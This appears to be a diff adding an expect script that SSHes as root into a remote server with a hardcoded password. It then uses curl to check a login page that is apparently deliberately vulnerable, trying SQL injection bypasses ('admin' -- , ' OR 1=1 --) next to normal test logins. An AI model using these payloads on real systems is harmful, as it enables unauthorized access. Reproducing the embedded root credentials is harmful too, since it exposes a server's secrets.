@@ -1,0 +1,83 @@
+#!/usr/bin/expect -f
+
+set timeout 30
+set password {$$R00tbeer02}
+
+spawn ssh root@155.138.197.128
+
+expect {
+    "password:" {
+        send "$password\r"
+    }
+    "yes/no" {
+        send "yes\r"
+        expect "password:"
+        send "$password\r"
+    }
+}
+
+expect "# "
+
+send "echo '=== Testing Dual-Mode Login ==='\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '1. Testing SQL Injection Login:'\r"
+expect "# "
+
+# Test SQL injection
+send "curl -s -L -c /tmp/sql_cookies.txt -X POST http://localhost/login.php -d \"username=admin' -- &password=x\" | grep -o 'Dashboard\\|Welcome back' | head -1\r"
+expect "# "
+
+# Verify SQL injection worked
+send "curl -s -b /tmp/sql_cookies.txt http://localhost/dashboard.php | grep -o 'Walter Administrator' | head -1\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '2. Testing Normal Login (admin/admin123):'\r"
+expect "# "
+
+# Test normal login
+send "curl -s -L -c /tmp/normal_cookies.txt -X POST http://localhost/login.php -d \"username=admin&password=admin123\" | grep -o 'Dashboard\\|Welcome back' | head -1\r"
+expect "# "
+
+# Verify normal login worked
+send "curl -s -b /tmp/normal_cookies.txt http://localhost/dashboard.php | grep -o 'Walter Administrator' | head -1\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '3. Testing Another User (john_doe/john123):'\r"
+expect "# "
+
+# Test another user
+send "curl -s -L -c /tmp/john_cookies.txt -X POST http://localhost/login.php -d \"username=john_doe&password=john123\" | grep -o 'Dashboard\\|Welcome back' | head -1\r"
+expect "# "
+
+# Verify john_doe login
+send "curl -s -b /tmp/john_cookies.txt http://localhost/dashboard.php | grep -o 'John Michael Doe' | head -1\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '4. Testing SQL Injection Variants:'\r"
+expect "# "
+
+# Test OR 1=1 injection
+send "curl -s -L -c /tmp/or_cookies.txt -X POST http://localhost/login.php -d \"username=' OR 1=1 -- &password=x\" | grep -o 'Dashboard\\|Welcome back' | head -1\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '5. Testing Wrong Password (should fail):'\r"
+expect "# "
+
+# Test wrong password
+send "curl -s -X POST http://localhost/login.php -d \"username=admin&password=wrongpass\" | grep -o 'Login failed' | head -1\r"
+expect "# "
+
+send "echo ''\r"
+send "echo 'All login methods tested!'\r"
+expect "# "
+
+send "exit\r"
+expect eof
+
+puts "\nDual-mode login testing complete!"
